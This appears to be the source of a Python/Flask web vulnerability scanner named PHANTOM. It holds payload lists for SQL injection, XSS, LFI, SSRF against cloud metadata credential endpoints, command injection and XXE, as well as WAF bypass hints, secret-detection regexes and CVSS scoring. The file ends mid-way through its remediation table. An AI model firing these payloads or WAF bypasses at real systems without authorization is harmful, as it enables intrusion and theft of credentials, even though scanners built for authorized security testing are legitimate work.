#!/usr/bin/env python3
"""
PHANTOM v4.0 - ULTIMATE Web Vulnerability Scanner
Flask Web App | Render.com | All 20+ Modules
"""
import base64,json,math,os,re,socket,ssl,threading,time,uuid,warnings
from collections import deque
from concurrent.futures import ThreadPoolExecutor,as_completed
from datetime import datetime
from typing import Optional
from urllib.parse import urljoin,urlparse,urlencode,parse_qsl,quote
import requests
from bs4 import BeautifulSoup
from flask import Flask,request,jsonify

warnings.filterwarnings("ignore")
try: requests.packages.urllib3.disable_warnings()
except: pass
try:    import dns.resolver,dns.query,dns.zone; DNS_OK=True
except: DNS_OK=False
try:    import whois as wh; WHOIS_OK=True
except: WHOIS_OK=False

PORT=int(os.environ.get("PORT",5000)); THREADS=15; TIMEOUT=8
DEPTH=3; MAXURLS=150; DELAY=0.08; VER="4.0"
app=Flask(__name__); scans={}
UAS=["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.2 Safari/605.1.15",
     "Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0"]

# ══ CVSS v3.1 ═══════════════════════════════════════════════════════════════
class CVSSv31:
    AV={"N":0.85,"A":0.62,"L":0.55,"P":0.2}; AC={"L":0.77,"H":0.44}
    PRU={"N":0.85,"L":0.62,"H":0.27}; PRC={"N":0.85,"L":0.68,"H":0.50}
    UI={"N":0.85,"R":0.62}; CIA={"N":0.0,"L":0.22,"H":0.56}
    VV={"SQL Injection":dict(av="N",ac="L",pr="N",ui="N",s="C",c="H",i="H",a="H"),
        "SQL Injection (Form)":dict(av="N",ac="L",pr="N",ui="N",s="C",c="H",i="H",a="H"),
        "XXE Injection":dict(av="N",ac="L",pr="N",ui="N",s="C",c="H",i="L",a="N"),
        "HTTP Request Smuggling":dict(av="N",ac="H",pr="N",ui="N",s="C",c="H",i="H",a="N"),
        "SSTI":dict(av="N",ac="L",pr="N",ui="N",s="C",c="H",i="H",a="H"),
        "LFI":dict(av="N",ac="L",pr="N",ui="N",s="U",c="H",i="L",a="N"),
        "LFI Config Read":dict(av="N",ac="L",pr="N",ui="N",s="C",c="H",i="H",a="L"),
        "Command Injection":dict(av="N",ac="L",pr="N",ui="N",s="C",c="H",i="H",a="H"),
        "SSRF":dict(av="N",ac="L",pr="N",ui="N",s="C",c="H",i="L",a="N"),
        "Unauthenticated Redis":dict(av="N",ac="L",pr="N",ui="N",s="C",c="H",i="H",a="H"),
        "Unauthenticated Elasticsearch":dict(av="N",ac="L",pr="N",ui="N",s="U",c="H",i="N",a="N"),
        "Unauthenticated MongoDB":dict(av="N",ac="L",pr="N",ui="N",s="U",c="H",i="H",a="N"),
        "FTP Anonymous Login":dict(av="N",ac="L",pr="N",ui="N",s="U",c="H",i="L",a="N"),
        "API Key Exposed":dict(av="N",ac="L",pr="N",ui="N",s="C",c="H",i="H",a="H"),
        "DNS Zone Transfer":dict(av="N",ac="L",pr="N",ui="N",s="U",c="H",i="N",a="N"),
        "Reflected XSS":dict(av="N",ac="L",pr="N",ui="R",s="C",c="L",i="L",a="N"),
        "Reflected XSS (Form)":dict(av="N",ac="L",pr="N",ui="R",s="C",c="L",i="L",a="N"),
        "CORS Misconfiguration":dict(av="N",ac="L",pr="N",ui="R",s="U",c="H",i="H",a="N"),
        "Open Redirect":dict(av="N",ac="L",pr="N",ui="R",s="U",c="L",i="L",a="N"),
        "Sensitive File Exposed":dict(av="N",ac="L",pr="N",ui="N",s="U",c="H",i="N",a="N"),
        "Admin Panel Found":dict(av="N",ac="L",pr="N",ui="N",s="U",c="L",i="L",a="N"),
        "Clickjacking":dict(av="N",ac="L",pr="N",ui="R",s="U",c="N",i="L",a="N"),
        "CSRF Missing Token":dict(av="N",ac="L",pr="N",ui="R",s="U",c="N",i="L",a="N"),
        "Insecure Cookie":dict(av="N",ac="H",pr="N",ui="R",s="U",c="L",i="N",a="N"),
        "JWT Issue":dict(av="N",ac="H",pr="N",ui="N",s="U",c="L",i="L",a="N"),
        "Missing Header (HIGH)":dict(av="N",ac="L",pr="N",ui="R",s="U",c="L",i="L",a="N"),
        "Missing Header (MEDIUM)":dict(av="N",ac="L",pr="N",ui="R",s="U",c="L",i="N",a="N"),
        "Info Disclosure":dict(av="N",ac="L",pr="N",ui="N",s="U",c="L",i="N",a="N"),
        "Outdated Service CVE":dict(av="N",ac="L",pr="N",ui="N",s="U",c="H",i="H",a="H"),
        "Open Port (Dangerous)":dict(av="N",ac="L",pr="N",ui="N",s="U",c="H",i="L",a="N"),
        "GraphQL Introspection":dict(av="N",ac="L",pr="N",ui="N",s="U",c="L",i="N",a="N"),
        "GraphQL DoS":dict(av="N",ac="L",pr="N",ui="N",s="U",c="N",i="N",a="H"),
        "Web Cache Poisoning":dict(av="N",ac="H",pr="N",ui="R",s="C",c="L",i="L",a="N"),
        "HTTP Parameter Pollution":dict(av="N",ac="L",pr="N",ui="N",s="U",c="L",i="L",a="N"),
        "Business Logic Flaw":dict(av="N",ac="L",pr="L",ui="N",s="U",c="L",i="H",a="N"),
        "OAuth Misconfiguration":dict(av="N",ac="L",pr="N",ui="R",s="U",c="H",i="H",a="N"),
        "WordPress Vulnerability":dict(av="N",ac="L",pr="N",ui="N",s="U",c="H",i="H",a="H"),
        "WebSocket Vulnerability":dict(av="N",ac="L",pr="N",ui="R",s="U",c="L",i="L",a="N"),
        "SSL/TLS Weakness":dict(av="N",ac="H",pr="N",ui="N",s="U",c="H",i="N",a="N"),
        "Rate Limiting Missing":dict(av="N",ac="L",pr="N",ui="N",s="U",c="L",i="L",a="H"),
        "CSP Weakness":dict(av="N",ac="L",pr="N",ui="R",s="C",c="L",i="L",a="N"),
        "Subdomain Found":dict(av="N",ac="L",pr="N",ui="N",s="U",c="L",i="N",a="N"),
        "Stack Trace Leaked":dict(av="N",ac="L",pr="N",ui="N",s="U",c="L",i="N",a="N"),
        "IDOR":dict(av="N",ac="L",pr="L",ui="N",s="U",c="H",i="H",a="N"),
        "Proto Pollution":dict(av="N",ac="L",pr="N",ui="N",s="C",c="L",i="L",a="H"),
        "Drupal Vulnerability":dict(av="N",ac="L",pr="N",ui="N",s="U",c="H",i="H",a="H"),
        "Joomla Vulnerability":dict(av="N",ac="L",pr="N",ui="N",s="U",c="H",i="H",a="N"),
        "Default Credentials":dict(av="N",ac="L",pr="N",ui="N",s="U",c="H",i="H",a="H"),
    }
    def score(self,vtype):
        vec=self.VV.get(vtype,dict(av="N",ac="L",pr="N",ui="N",s="U",c="L",i="L",a="N"))
        av_v=self.AV[vec["av"]]; ac_v=self.AC[vec["ac"]]
        pr_v=(self.PRC if vec["s"]=="C" else self.PRU)[vec["pr"]]
        ui_v=self.UI[vec["ui"]]
        c_v=self.CIA[vec["c"]]; i_v=self.CIA[vec["i"]]; a_v=self.CIA[vec["a"]]
        isc=1-(1-c_v)*(1-i_v)*(1-a_v)
        if isc<=0: impact=0.0
        elif vec["s"]=="U": impact=6.42*isc
        else: impact=7.52*(isc-0.029)-3.25*((isc-0.02)**15)
        exp=8.22*av_v*ac_v*pr_v*ui_v
        if impact<=0: raw=0.0
        elif vec["s"]=="U": raw=min(impact+exp,10)
        else: raw=min(1.08*(impact+exp),10)
        final=math.ceil(raw*10)/10
        vs=(f"CVSS:3.1/AV:{vec['av']}/AC:{vec['ac']}/PR:{vec['pr']}/"
            f"UI:{vec['ui']}/S:{vec['s']}/C:{vec['c']}/I:{vec['i']}/A:{vec['a']}")
        sev=("NONE" if final==0 else "LOW" if final<4 else
             "MEDIUM" if final<7 else "HIGH" if final<9 else "CRITICAL")
        return round(final,1),vs,sev

CVSS=CVSSv31()

# ══ WAF FINGERPRINTER ════════════════════════════════════════════════════════
class WAFFingerprinter:
    HS={"Cloudflare":[("cf-ray",""),("server","cloudflare"),("cf-cache-status","")],
        "AWS WAF":[("x-amzn-requestid",""),("x-amz-cf-id","")],
        "Akamai":[("x-akamai-request-id",""),("server","akamaighost")],
        "Sucuri":[("x-sucuri-id",""),("x-sucuri-cache","")],
        "Incapsula":[("x-iinfo",""),("x-cdn","incapsula")],
        "ModSecurity":[("x-mod-security",""),("x-modsec-ruleid","")],
        "F5 BIG-IP":[("server","bigip"),("x-wa-info","")],
        "Barracuda":[("x-barracuda-connect","")],
        "FortiWeb":[("x-forwarded-by","fortiweb")],
        "Wordfence":[("x-wordfence-cache","")],
        "Fastly":[("x-fastly-request-id","")],
        "Azure Front Door":[("x-azure-requestid",""),("x-azure-ref","")],
        "Varnish":[("x-varnish",""),("via","varnish")],
        "DDoS-GUARD":[("server","ddos-guard")],
        "PerimeterX":[("x-px-enforce","")]}
    CS={"Cloudflare":["__cfduid","cf_clearance","__cf_bm"],
        "Incapsula":["incap_ses_","visid_incap_"],
        "AWS ELB":["AWSELB","AWSALBCORS"],
        "Akamai":["ak_bmsc","bm_sz","_abck"],
        "F5 BIG-IP":["BIGipServer"],
        "PerimeterX":["_px2","_px3"],
        "DataDome":["datadome"]}
    BS={"Cloudflare":["cloudflare ray id","cf-ray","attention required! | cloudflare"],
        "Sucuri":["access denied - sucuri website firewall"],
        "Incapsula":["incapsula incident id","request unsuccessful"],
        "ModSecurity":["406 not acceptable","this request has been blocked"],
        "Wordfence":["wordfence","generated by wordfence"],
        "Barracuda":["barracuda networks"],
        "SiteLock":["sitelock protection"]}
    BYPASS={"Cloudflare":["<ScRiPt>alert(1)</ScRiPt>","%3Cscript%3Ealert(1)%3C%2Fscript%3E"],
            "ModSecurity":["<script>alert(String.fromCharCode(88,83,83))</script>"],
            "Generic":[quote("' OR 1=1--"),"'+OR+1=1--"]}
    def detect(self,url,job):
        result={"waf":None,"confidence":0,"bypass_hint":"None needed","details":[]}
        try:
            r=requests.get(url+"/?waf_test=<script>alert(1)</script>&id=1 OR 1=1",
                           headers={"User-Agent":UAS[0]},timeout=TIMEOUT,verify=False)
        except: return result
        hlc={k.lower():v.lower() for k,v in r.headers.items()}
        body=r.text.lower(); ck=" ".join(r.cookies.keys()).lower()
        scores={}
        for waf,sigs in self.HS.items():
            for hdr,val in sigs:
                if hdr in hlc and(not val or val in hlc.get(hdr,"")):
                    scores[waf]=scores.get(waf,0)+3
        for waf,cks in self.CS.items():
            for c in cks:
                if c.lower() in ck: scores[waf]=scores.get(waf,0)+2
        for waf,pats in self.BS.items():
            for p in pats:
                if p in body: scores[waf]=scores.get(waf,0)+4
        if r.status_code in(403,406,429,503) and not scores:
            result.update({"waf":"Unknown WAF","confidence":40,
                           "bypass_hint":"Try URL/hex encoding payloads"}); return result
        if scores:
            best=max(scores,key=scores.get)
            hints={"Cloudflare":"Use Unicode normalisation or case mixing",
                   "ModSecurity":"Comment injection /**/ or null byte insertion",
                   "AWS WAF":"HTTP parameter pollution or JSON payloads",
                   "Sucuri":"Slow-rate obfuscated payloads",
                   "Akamai":"Fragmented requests or alternate content-type"}
            result.update({"waf":best,"confidence":min(scores[best]*10,100),
                           "bypass_hint":hints.get(best,"Try URL-encoding or case variation"),
                           "bypass_payloads":self.BYPASS.get(best,self.BYPASS["Generic"])})
            job.log(f"WAF: {best} ({result['confidence']}%) | {result['bypass_hint']}","WARN")
        return result

WAF_ENGINE=WAFFingerprinter()

# ══ SMART FUZZER ═════════════════════════════════════════════════════════════
class SmartFuzzer:
    PTR=[(["id","uid","userid","user_id","pid"],"integer"),
         (["page","limit","offset","skip"],"pagination"),
         (["email","mail"],"email"),
         (["url","link","href","redirect","return","next","goto"],"url"),
         (["file","path","dir","template","doc","lang"],"path"),
         (["search","q","query","keyword","term","s","find"],"search"),
         (["name","username","user","login"],"username"),
         (["cat","category","type","tag","filter","sort","order"],"category"),
         (["json","data","body","payload"],"json"),
         (["callback","cb","jsonp","func"],"callback")]
    SQLI={"integer":["' OR 1=1--","1 OR 1=1","0 OR 1=1","1' UNION SELECT NULL--","999999"],
          "search":["test' OR '1'='1","' UNION SELECT 1,2,3--","' OR 1=1#"],
          "string":["' OR '1'='1","' OR 1=1#","' UNION SELECT NULL,NULL--","admin'--"],
          "username":["admin'--","admin' OR 1=1--","' OR '1'='1"]}
    XSS={"search":['<script>alert(1)</script>','"><script>alert(1)</script>','<svg onload=alert(1)>'],
         "string":['"><script>alert(1)</script>','<img src=x onerror=alert(1)>','{{7*7}}'],
         "username":['admin"><script>alert(1)</script>','<script>alert(1)</script>'],
         "callback":["alert(1)","javascript:alert(1)"],
         "url":["javascript:alert(1)"]}
    BOUNDARY={"integer":["0","-1","2147483647","-2147483648","999999","null","NaN"],
              "pagination":["0","-1","9999","1000000"],
              "string":["","   ","A"*100,"\x00","null","undefined"],
              "search":["*","**","%",".",""]}
    NOSQL=['{"$ne":null}','{"$gt":""}','{"$regex":".*"}','{"$nin":[]}']
    PROTO=["__proto__[polluted]=1","constructor[prototype][polluted]=1"]
    SSTI=["{{7*7}}","${7*7}","#{7*7}","<%= 7*7 %>","{{config}}","{{request.environ}}"]
    def detect_type(self,name,value):
        nl=name.lower()
        for keys,pt in self.PTR:
            if any(k in nl for k in keys): return pt
        if value.isdigit(): return "integer"
        if re.match(r"^[^@]+@[^@]+\.[^@]+$",value): return "email"
        if value.startswith(("http","//")): return "url"
        return "string"
    def get_sqli(self,pt): return self.SQLI.get(pt,self.SQLI["string"])
    def get_xss(self,pt):  return self.XSS.get(pt,self.XSS["string"])
    def get_boundary(self,pt): return self.BOUNDARY.get(pt,self.BOUNDARY["string"])
    def mutate(self,v):
        if v.isdigit():
            n=int(v); return [str(n+1),str(n-1),"0","-1",str(n+100)]
        return [v+"'",v+'"',v+" OR 1=1",v+"<script>alert(1)</script>",v+"/../../../etc/passwd"]

FUZZER=SmartFuzzer()

# ══ JS SECRET PATTERNS (45+) ═════════════════════════════════════════════════
JS_SECRETS={
    "AWS Access Key":  r"AKIA[0-9A-Z]{16}",
    "Google API Key":  r"AIza[0-9A-Za-z\-_]{35}",
    "Firebase DB":     r"https://[a-z0-9\-]+\.firebaseio\.com",
    "Stripe Live SK":  r"sk_live_[0-9a-zA-Z]{24}",
    "Stripe Test SK":  r"sk_test_[0-9a-zA-Z]{24}",
    "GitHub PAT":      r"ghp_[a-zA-Z0-9]{36}",
    "GitHub Fine PAT": r"github_pat_[A-Za-z0-9_]{82}",
    "GitLab Token":    r"glpat-[0-9a-zA-Z\-_]{20}",
    "NPM Token":       r"npm_[A-Za-z0-9]{36}",
    "Slack Bot":       r"xoxb-[0-9]+-[0-9]+-[a-zA-Z0-9]+",
    "Slack Webhook":   r"https://hooks\.slack\.com/services/T[A-Z0-9]+/B[A-Z0-9]+/[A-Za-z0-9]+",
    "Discord Token":   r"[MN][A-Za-z0-9_-]{23}\.[\w-]{6}\.[\w-]{27}",
    "Discord Webhook": r"https://discord(?:app)?\.com/api/webhooks/[0-9]+/[A-Za-z0-9_-]+",
    "Telegram Bot":    r"[0-9]{8,10}:[A-Za-z0-9_-]{35}",
    "Twilio SID":      r"AC[a-z0-9]{32}",
    "SendGrid Key":    r"SG\.[a-zA-Z0-9_-]{22}\.[a-zA-Z0-9_-]{43}",
    "Mailgun Key":     r"key-[a-z0-9]{32}",
    "Mailchimp Key":   r"[a-f0-9]{32}-us[0-9]{1,2}",
    "OpenAI Key":      r"sk-[a-zA-Z0-9]{48}",
    "HuggingFace":     r"hf_[A-Za-z0-9]{34}",
    "Heroku Key":      r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}",
    "Cloudinary":      r"cloudinary://[0-9]+:[A-Za-z0-9_-]+@[a-z0-9]+",
    "Mapbox Token":    r"pk\.eyJ1Ijoi[A-Za-z0-9_-]+",
    "MongoDB URI":     r'mongodb(\+srv)?://[^\s:]+:[^\s@]+@[^\s]+',
    "PostgreSQL URI":  r'postgres(?:ql)?://[^\s:]+:[^\s@]+@[^\s]+',
    "MySQL URI":       r'mysql://[^\s:]+:[^\s@]+@[^\s]+',
    "Redis URI":       r'redis://:?[^@\s]+@[^\s/]+',
    "RSA Private Key": r"-----BEGIN RSA PRIVATE KEY-----",
    "EC Private Key":  r"-----BEGIN EC PRIVATE KEY-----",
    "OpenSSH Key":     r"-----BEGIN OPENSSH PRIVATE KEY-----",
    "JWT Token":       r"eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*",
    "Bearer Token":    r"(?i)Bearer\s+([A-Za-z0-9_.+/=-]{20,})",
    "DB Password":     r"(?i)(DB_PASSWORD|DATABASE_PASSWORD|DB_PASS)\s*=\s*\S+",
    "Generic Secret":  r"(?i)(secret|password|api_key|access_token)\s*[=:]\s*[^\s]{10,80}",
    "Credentials URL": r"https?://[A-Za-z0-9_\-]+:[A-Za-z0-9_\-!@#$%^&*()]{4,}@",
    "Internal IP":     r"\b(?:10\.\d{1,3}\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})\b",
    "GCP Service Acct":r'"type":\s*"service_account"',
    "Hashicorp Vault": r"hvs\.[A-Za-z0-9_-]{24}",
    "Razorpay Key":    r"rzp_(live|test)_[A-Za-z0-9]{14}",
    "PayPal Secret":   r"(?i)paypal.{0,20}secret.{0,20}[A-Za-z0-9]{16,}",
    "JDBC String":     r"jdbc:[a-z]+://[^\s]+password=[^&\s;]+",
    "AWS Session":     r"AQoD[A-Za-z0-9/+=]{100,}",
    "Stripe Pub Key":  r"pk_live_[0-9a-zA-Z]{24}",
}
SECRET_SEV={"AWS Access Key":"CRITICAL","MongoDB URI":"CRITICAL","OpenAI Key":"CRITICAL",
            "RSA Private Key":"CRITICAL","Stripe Live SK":"CRITICAL","Credentials URL":"CRITICAL",
            "JWT Token":"HIGH","GitHub PAT":"HIGH","SendGrid Key":"HIGH","Slack Bot":"HIGH",
            "Generic Secret":"HIGH","Internal IP":"MEDIUM","DB Password":"CRITICAL"}

# ══ PAYLOADS ══════════════════════════════════════════════════════════════════
SQL_PAYLOADS=[
    "'",'"',"''","\'"," OR 1=1--","' OR '1'='1","' OR 1=1#","' OR 1=1 LIMIT 1--",
    '" OR 1=1--',"admin'--","admin'#","') OR ('1'='1",
    "' UNION SELECT NULL--","' UNION SELECT NULL,NULL--","' UNION SELECT NULL,NULL,NULL--",
    "1' ORDER BY 1--+","1' ORDER BY 2--+","1' ORDER BY 3--+",
    "1 AND 1=1","1 AND 1=2","' AND '1'='1","' AND '1'='2",
    "' AND SLEEP(3)--","1; WAITFOR DELAY '0:0:3'--","'; SELECT pg_sleep(3)--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,DATABASE()))--",
    "%27","1%27 OR 1=1",
]
SQL_ERRORS=[
    r"sql syntax.*mysql",r"warning.*mysql_",r"you have an error in your sql syntax",
    r"check the manual that corresponds to your (mysql|mariadb)",
    r"unclosed quotation mark",r"quoted string not properly terminated",
    r"microsoft ole db provider",r"pg_exec\(",r"pg_query\(",
    r"ora-\d{5}",r"oracle error",r"sqlite_.*error",r"error.*sqlite",
    r"sql server.*driver",r"mssql_query\(",r"syntax error.*in query expression",
    r"data type mismatch in criteria",r"invalid column name",r"unknown column",
    r"right syntax to use near",r"column count doesn",r"supplied argument is not a valid",
]
XSS_PAYLOADS=[
    '<script>alert(1)</script>','"><script>alert(1)</script>',
    "'><script>alert(1)</script>",'<img src=x onerror=alert(1)>',
    '"><img src=x onerror=alert(1)>','<svg onload=alert(1)>','<svg/onload=alert(1)>',
    '<details open ontoggle=alert(1)>','<input autofocus onfocus=alert(1)>',
    '{{7*7}}','${7*7}','#{7*7}','" onmouseover="alert(1)',
]
LFI_PAYLOADS=["../../../../etc/passwd","../../../etc/passwd","../../etc/passwd",
    "../../../../etc/passwd%00","....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/convert.base64-encode/resource=config.php",
    "../../../../windows/win.ini"]
LFI_INDICATORS=["root:x:","bin:x:","daemon:x:","[extensions]","[fonts]"]
LFI_PARAMS=["file","page","path","include","load","template","view","lang","doc","read","open"]
SSRF_PARAMS=["url","path","host","endpoint","redirect","src","fetch","load","proxy","dest","href","uri"]
SSRF_PAYLOADS=["http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/metadata/instance",
    "http://localhost/","http://127.0.0.1/","file:///etc/passwd"]
CMD_PAYLOADS=["; id","| id","` id`","$(id)","; whoami","| whoami","; sleep 3","| sleep 3"]
CMD_INDICATORS=["uid=","gid=","groups=","root:","daemon:","total ","drwxr"]
REDIRECT_PARAMS=["redirect","url","next","return","returnTo","goto","target","dest","to","forward","callback"]
REDIRECT_PAYLOADS=["//evil-phantom-test.com","https://evil-phantom-test.com","///evil-phantom-test.com"]
SENSITIVE_FILES=[
    "/.env","/.env.local","/.env.backup","/.env.prod","/.env.dev",
    "/.git/config","/.git/HEAD","/.git/COMMIT_EDITMSG",
    "/config.php","/wp-config.php","/configuration.php",
    "/config.yml","/config.yaml","/config.json","/database.yml","/secrets.yml",
    "/.htaccess","/.htpasswd","/web.config",
    "/phpinfo.php","/info.php","/test.php",
    "/backup.sql","/dump.sql","/db.sql","/database.sql",
    "/backup.zip","/backup.tar.gz",
    "/robots.txt","/sitemap.xml","/crossdomain.xml",
    "/xmlrpc.php","/wp-login.php","/composer.json","/package.json",
    "/server-status","/server-info","/.DS_Store",
    "/swagger.json","/openapi.json","/api-docs","/graphql","/graphiql",
    "/.bash_history","/readme.md",
    "/actuator/health","/actuator/env","/actuator/beans","/actuator/mappings",
    "/_ah/admin","/jmx-console","/console","/manager/html",
]
ADMIN_PATHS=["/admin","/admin/","/administrator","/wp-admin","/phpmyadmin","/pma/",
    "/dashboard","/panel","/manage","/backend","/cms","/login","/signin",
    "/user/login","/auth/login","/cpanel","/webmin","/secure"]
SECURITY_HEADERS={
    "X-Frame-Options":             {"desc":"Clickjacking protection","risk":"HIGH",  "rec":"DENY"},
    "X-XSS-Protection":            {"desc":"Browser XSS filter",    "risk":"MEDIUM","rec":"1; mode=block"},
    "X-Content-Type-Options":      {"desc":"MIME sniffing block",    "risk":"MEDIUM","rec":"nosniff"},
    "Strict-Transport-Security":   {"desc":"Forces HTTPS (HSTS)",    "risk":"HIGH",  "rec":"max-age=31536000; includeSubDomains"},
    "Content-Security-Policy":     {"desc":"XSS/injection policy",   "risk":"HIGH",  "rec":"default-src 'self'"},
    "Referrer-Policy":             {"desc":"Referrer control",        "risk":"LOW",   "rec":"strict-origin-when-cross-origin"},
    "Permissions-Policy":          {"desc":"Browser feature ctrl",   "risk":"LOW",   "rec":"geolocation=(), microphone=()"},
    "Cross-Origin-Opener-Policy":  {"desc":"Cross-origin isolation",  "risk":"MEDIUM","rec":"same-origin"},
    "Cross-Origin-Embedder-Policy":{"desc":"Embedding restriction",  "risk":"MEDIUM","rec":"require-corp"},
    "Cross-Origin-Resource-Policy":{"desc":"Resource sharing ctrl",  "risk":"MEDIUM","rec":"same-origin"},
    "Expect-CT":                   {"desc":"Cert transparency",       "risk":"LOW",   "rec":"max-age=86400, enforce"},
}
TOP_PORTS=[21,22,23,25,53,80,110,143,443,445,1433,3000,3306,3389,4000,5000,
           5432,5672,5900,6379,8000,8080,8081,8083,8088,8443,8888,9000,9090,
           9200,9300,10000,11211,27017,50000]
DANGEROUS_PORTS={23:"Telnet",6379:"Redis",27017:"MongoDB",9200:"Elasticsearch",
                 11211:"Memcached",8888:"Jupyter"}
VERSION_CVE={
    r"OpenSSH[_/ ]([\d.]+)":[((7,4),"CVE-2016-6515 DoS"),((8,5),"CVE-2021-28041"),((9,6),"CVE-2023-51385 RCE")],
    r"Apache[/ ]([\d.]+)":  [((2,4,51),"CVE-2021-41773 path traversal"),((2,4,56),"CVE-2023-25690")],
    r"nginx[/ ]([\d.]+)":   [((1,21,0),"CVE-2021-23017 buffer overwrite"),((1,25,3),"CVE-2023-44487")],
    r"PHP/([\d.]+)":         [((7,4,0),"CVE-2019-11043 RCE"),((8,0,0),"CVE-2021-21707")],
}
XXE_PAYLOADS=[
    '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe;]><foo/>',
]
XXE_INDICATORS=["root:x:","bin:x:","daemon:x:","ami-id","instance-id"]
GRAPHQL_INTRO="{__schema{types{name fields{name}}}}"
GRAPHQL_DEEP="{user{friends{friends{friends{id name}}}}}"
CACHE_HEADERS=[("X-Forwarded-Host","evil-phantom-test.com"),("X-Forwarded-Scheme","http"),
               ("X-Original-URL","/admin"),("X-Rewrite-URL","/admin"),
               ("Forwarded","host=evil-phantom-test.com"),("X-Host","evil-phantom-test.com")]
WP_PATHS=["/wp-json/wp/v2/users","/wp-json/wp/v2/posts","/wp-content/plugins/",
          "/?author=1","/?author=2","/wp-login.php?action=register",
          "/readme.html","/license.txt","/xmlrpc.php"]
JOOMLA_PATHS=["/administrator/","/configuration.php~","/joomla.xml",
              "/CHANGELOG.php","/administrator/manifests/files/joomla.xml"]
DRUPAL_PATHS=["/CHANGELOG.txt","/core/CHANGELOG.txt","/update.php",
              "/?q=admin","/node/1","/sites/default/files/","/misc/drupal.js"]
SUBDOMAIN_WORDS=["admin","api","app","auth","beta","blog","cdn","ci","cloud","cms",
    "dashboard","data","db","dev","docs","email","ftp","git","help","internal",
    "jenkins","jira","lab","login","mail","manage","mobile","monitor","mysql",
    "old","panel","prod","redis","s3","secure","shop","smtp","ssh","stage",
    "staging","static","store","support","test","tools","upload","vault","vpn","wiki","www2"]
VULN_IMPACT={
    "SQL Injection":"Full DB compromise — read/modify/delete, RCE via INTO OUTFILE",
    "SQL Injection (Form)":"Full DB compromise via form input",
    "XXE Injection":"Read server files, SSRF to internal/cloud services, DoS",
    "HTTP Request Smuggling":"Session hijacking, cache poisoning, request desync",
    "SSTI":"Remote Code Execution via template engine",
    "LFI":"Read server files, chain to RCE via log poisoning",
    "LFI Config Read":"Config decoded — credentials exposed",
    "Command Injection":"OS command execution — full system compromise",
    "SSRF":"Access cloud metadata, internal network pivot",
    "Reflected XSS":"Session hijacking, credential theft, keylogger injection",
    "Reflected XSS (Form)":"XSS via form — session theft",
    "GraphQL Introspection":"Full API schema exposed — all endpoints enumerable",
    "GraphQL DoS":"Deeply nested query causes server CPU exhaustion",
    "Web Cache Poisoning":"Malicious response served to all users",
    "HTTP Parameter Pollution":"WAF/logic bypass via duplicate params",
    "Business Logic Flaw":"Price manipulation, auth bypass, privilege escalation",
    "OAuth Misconfiguration":"Account takeover via redirect_uri or state forgery",
    "WordPress Vulnerability":"CMS exploit: user enum, plugin RCE, XML-RPC abuse",
    "Drupal Vulnerability":"Drupalgeddon/RCE via known Drupal CVEs",
    "Joomla Vulnerability":"Joomla RCE via exposed admin or known CVEs",
    "Default Credentials":"Admin access via unchanged default username/password",
    "WebSocket Vulnerability":"Cross-site WS hijacking or message injection",
    "SSL/TLS Weakness":"Downgrade attack (POODLE/BEAST), traffic decryption",
    "Rate Limiting Missing":"Brute-force, enumeration, API abuse possible",
    "CSP Weakness":"XSS via CSP bypass, data exfiltration possible",
    "Subdomain Found":"Extended attack surface — dev servers, shadow IT",
    "CORS Misconfiguration":"Cross-origin API calls — full account takeover",
    "Sensitive File Exposed":"Credentials, source code, or DB dumps exposed",
    "Admin Panel Found":"Admin interface exposed — brute-force risk",
    "Clickjacking":"UI redressing — unintended action trick",
    "CSRF Missing Token":"Forged authenticated requests on behalf of victims",
    "Insecure Cookie":"Session token theft via MITM, XSS, or CSRF",
    "JWT Issue":"JWT tampering — privilege escalation, session forgery",
    "Missing Header (HIGH)":"Enables clickjacking, XSS, downgrade attacks",
    "Missing Header (MEDIUM)":"Reduces security defence-in-depth",
    "Info Disclosure":"Tech stack exposed — enables targeted attacks",
    "Open Port (Dangerous)":"Dangerous service exposed — likely unauthenticated",
    "Unauthenticated Redis":"All Redis keys readable/writable without auth",
    "FTP Anonymous Login":"Unauthenticated file access",
    "Unauthenticated Elasticsearch":"All indices accessible without credentials",
    "Unauthenticated MongoDB":"Database collections accessible without auth",
    "DNS Zone Transfer":"All subdomains enumerated",
    "Outdated Service CVE":"Known exploitable vulnerability in service version",
    "Open Redirect":"Phishing via trusted domain, OAuth redirect bypass",
    "API Key Exposed":"Direct third-party service access — financial/data loss",
    "IDOR":"Access other users data — privilege escalation",
    "Stack Trace Leaked":"Framework/path info — aids targeted attacks",
    "Proto Pollution":"JavaScript prototype pollution — DoS or RCE in Node.js",
}
VULN_FIX={
    "SQL Injection":["Use parameterized queries: cursor.execute('SELECT * FROM t WHERE id=%s',(id,))","Apply strict input whitelist","Enforce least-privilege DB user"],
    "XXE Injection":["Disable external entity processing: libxml_disable_entity_loader(true)","Use SimpleXML with LIBXML_NOENT disabled","Validate XML schema before parsing"],
    "HTTP Request Smuggling":["Reject ambiguous requests at frontend","Normalize Content-Length/Transfer-Encoding","Update to HTTP/2 end-to-end"],
    "GraphQL Introspection":["Disable introspection in production","Implement query depth limiting","Add query cost analysis","Rate-limit GraphQL endpoint"],
    "Reflected XSS":["HTML-encode output: htmlspecialchars($v,ENT_QUOTES,'UTF-8')","Implement strict Content-Security-Policy","Use framework auto-escaping"],
